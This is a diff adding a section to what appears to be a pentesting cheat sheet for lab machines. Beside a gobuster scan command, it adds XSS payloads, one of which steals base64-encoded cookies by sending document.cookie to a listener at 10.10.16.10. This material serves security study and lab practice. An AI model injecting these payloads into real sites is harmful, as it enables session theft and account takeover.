@@ -70,6 +70,20 @@ Gobuster
 gobuster dir -u http://10.129.155.74:3000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx
 ```
 
+### Pentesting Website Applications
+
+XSS Payloads:
+Cheatsheet: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+Basic XSS form testing with either netcat listener or python web server
+```
+<img src=http://10.10.16.10/pwn.jpg/>
+```
+
+Cross Site scripting to dump base64 cookies. Make sure to url encode in burp with ctrl + u
+```
+<img src=x onerror=this.src='http://10.10.16.10/?cookies='+btoa(document.cookie) />
+```
 ### Pentesting SNMP
 
 Port 161 UDP
